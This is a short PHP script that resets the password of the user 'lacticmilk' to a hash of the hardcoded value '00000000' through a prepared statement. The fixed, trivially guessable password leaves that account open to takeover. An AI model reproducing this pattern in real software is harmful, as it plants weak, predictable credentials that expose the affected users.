<?php
require 'config/db.php';

$stmt = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");
$stmt->execute([password_hash('00000000', PASSWORD_DEFAULT), "lacticmilk"]);
$result = $stmt->fetchAll();

?>